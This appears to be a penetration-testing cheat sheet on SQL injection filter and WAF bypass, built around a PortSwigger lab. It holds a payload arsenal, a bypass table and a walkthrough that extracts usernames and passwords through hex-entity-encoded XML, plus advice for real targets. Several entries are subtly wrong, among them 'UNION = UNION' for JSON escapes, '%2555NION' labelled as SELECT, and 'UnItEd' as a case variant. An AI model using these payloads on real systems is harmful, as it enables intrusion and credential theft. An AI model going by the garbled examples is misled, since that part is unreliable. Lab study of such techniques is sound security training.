# SQL injection - WAF / filter bypass

A WAF or keyword filter blocks obvious payloads (`UNION`, `SELECT`, spaces). Bypass by changing the *representation* of the request - most powerfully by injecting through an alternate input format (XML/JSON) and encoding the SQL keywords so the filter never sees them, while the parser still decodes them. Max impact: full SQLi through a "protected" endpoint.

## Quick reference

```
-- XML body: encode keywords as XML entities so the WAF can't keyword-match
<storeId>1 UNION SELECT username || '~' || password FROM users</storeId>
   -> hex-entity encode the inner text:
<storeId>&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e; ...</storeId>
-- generic keyword obfuscation
UNI/**/ON  SEL/**/ECT          -- inline comments split keywords
/*!50000UNION*/ /*!SELECT*/     -- MySQL version-gated comments (executed)
UNION / SELSELECTECT           -- nested keyword (filter strips once)
%55NION  (URL/double-URL/unicode encoding)
```

Decision list:
- Payload blocked but input is XML/JSON -> encode the keyword chars as entities/unicode escapes (`../` parser decodes, WAF doesn't).
- Payload blocked in normal param -> try comment-splitting, case, nested keywords, encoding layers.
- "1+1 evaluates" in a numeric XML field -> injectable; build UNION, then bypass the block.

## Root cause
Two layers disagree on decoding: the WAF inspects the raw bytes (keyword blocklist), while the application's XML/JSON parser (or URL decoder, or DB) decodes entities/escapes first. Anything the parser decodes but the WAF doesn't = a bypass.

## Find it (recon and detection)
- Identify alternate input formats: stock-check / cart / search endpoints often POST XML or JSON (`Content-Type: application/xml`).
- **Probe evaluation:** replace a numeric value with an expression - `<storeId>1+1</storeId>` returning store 2's stock proves server-side evaluation.
- **Trip the WAF:** `<storeId>1 UNION SELECT NULL</storeId>` -> "attack detected"/blocked. Now you know there's a filter to evade.

## Technique
1. **Confirm injection** via arithmetic (`1+1`) in the XML/JSON field.
2. **Confirm the WAF** by sending a plain `UNION SELECT` (gets blocked).
3. **Encode the payload** so the keyword bytes never appear literally:
   - **XML entities:** encode each char of the SQL as `&#xNN;` (hex) or `&#NN;` (decimal). The XML parser decodes them to `UNION SELECT ...` before the DB sees it; the WAF sees only entities. (Hackvertor -> `Encode -> hex_entities`/`dec_entities` automates this.)
   - **JSON unicode escapes:** `UNION` = `UNION`.
4. **Build the exploit** through the decoded channel. If the query returns one column, concatenate: `1 UNION SELECT username || '~' || password FROM users`.

**Advanced / generic WAF bypasses (beyond XML):**
- **Inline comments** split keywords: `UN/**/ION SE/**/LECT`, also replace spaces: `UNION/**/SELECT/**/NULL`.
- **MySQL executable comments:** `/*!UNION*/ /*!SELECT*/`, version-gated `/*!50000UNION*/`.
- **Case variation:** `UnItEd`... filters that only match uppercase.
- **Nested keywords:** `UNIONUNION`/`SELSELECTECT` - a filter that strips one `UNION`/`SELECT` leaves a valid one.
- **Encoding layers:** URL (`%55`), double-URL (`%2555`), unicode, overlong UTF-8; useful where the framework decodes twice.
- **Whitespace alternatives:** `%09 %0a %0c %0d %a0`, parentheses `UNION(SELECT(...))`, comments.
- **Keyword-free logic:** `||`/`&&` for OR/AND; `CASE`; arithmetic-only boolean tests.
- **Buffer/JSON tricks:** add junk keys, change content-type, parameter pollution (`id=1&id=' OR 1=1--`).

## Payload arsenal
```
-- XML entity-encoded UNION (concept; encode the inner chars)
<stockCheck><productId>1</productId>
  <storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>
</stockCheck>
-- e.g. encode 'S' of SELECT as &#x53;  -> &#x53;ELECT  (parser decodes, WAF misses)
-- comment / case / nesting (any param)
'/**/UNION/**/SELECT/**/NULL,NULL--
'/*!UNION*//*!SELECT*/NULL,NULL--
'%09UNION%09SELECT%09NULL--
'UNIONUNION SELECTSELECT 1,2--           -- if filter strips one occurrence
' || (SEL/**/ECT password FROM users LIMIT 1) || '
-- encoding layers
%2555NION  (double-url SELECT)  ;  UNION (json)
```

## Bypasses
| Filter behaviour | Bypass |
|---|---|
| keyword blocklist on raw bytes | XML/JSON entity/unicode encoding (parser decodes later) |
| strips one `UNION`/`SELECT` | nest: `UNIONUNION`, `SELSELECTECT` |
| blocks spaces | `/**/`, `%09/%0a`, parentheses |
| case-sensitive match | mixed case |
| single URL-decode | double-encode `%2555` |
| blocks `OR`/`AND` | `||`/`&&`, `CASE`, arithmetic |
| Content-Type allowlist | switch XML↔JSON↔form; parameter pollution |

## Exploitation walkthrough (XML stock-check, WAF)
1. POST `/product/stock` sends `<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>`.
2. `<storeId>1+1</storeId>` returns store 2's stock ⇒ `storeId` is evaluated (injectable).
3. `<storeId>1 UNION SELECT NULL</storeId>` -> blocked by WAF.
4. Hex-entity-encode the inner text (Hackvertor `hex_entities`): `<storeId><@hex_entities>1 UNION SELECT NULL</@hex_entities></storeId>` -> normal response ⇒ WAF bypassed.
5. One column returned, so concatenate: `<@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities>` -> usernames/passwords (`administrator~...`).
6. Log in as administrator -> solved.

## Chaining
- The XML-entity trick is shared with [XXE-injection](../../XXE-injection/) (and external-entity OOB in `../Out-of-band-OAST/`).
- After bypass, you're back to normal [UNION-based](../UNION-based/) / [Examining-the-database](../Examining-the-database/) exploitation.
- Alternate-format injection mindset applies to [NoSQL-injection](../../NoSQL-injection/), [GraphQL](../../GraphQL-API-vulnerabilities/), and [API-testing](../../API-testing/).

## Tools
- **Hackvertor** (Burp extension): in-place `dec_entities`/`hex_entities` tags `<@hex_entities>...</@hex_entities>` - encodes just the selected text.
- **Burp Repeater:** craft the XML/JSON body, toggle encodings.
- **Burp Intruder + payload processing:** apply encodings to a wordlist of keyword variants.
- **sqlmap `--tamper`:** `space2comment`, `charunicodeencode`, `between`, etc. automate many of these.

## Labs

### Lab: SQL injection with filter bypass via XML encoding [Practitioner]
- URL: https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding
- Method: stock-check posts XML. Prove eval with `<storeId>1+1</storeId>`. `UNION SELECT` is WAF-blocked. Hex-entity-encode the payload (Hackvertor `hex_entities`) so the WAF can't keyword-match; the XML parser decodes it for the DB. Single column -> `1 UNION SELECT username || '~' || password FROM users`. Read creds, log in.
- Insight: the WAF inspects raw bytes; the XML parser decodes entities afterward - encode keywords to slip between the two layers.
- Real-target transfer: any XML/JSON endpoint behind a WAF - entity/unicode-encode the SQL keywords; arithmetic in a numeric field is the tell that it's injectable.

## Real-world notes
- WAF bypass via alternate format + encoding is a high-value real-world technique - many "protected" APIs are only protected against the literal string.
- Always test the non-obvious input formats (XML, JSON, multipart, protobuf) and content-type switching.
- CVSS: same as the underlying SQLi (often Critical); the bypass just makes a "blocked" finding exploitable.

## References
- https://portswigger.net/web-security/sql-injection (SQL injection in different contexts)
- https://portswigger.net/web-security/sql-injection/cheat-sheet
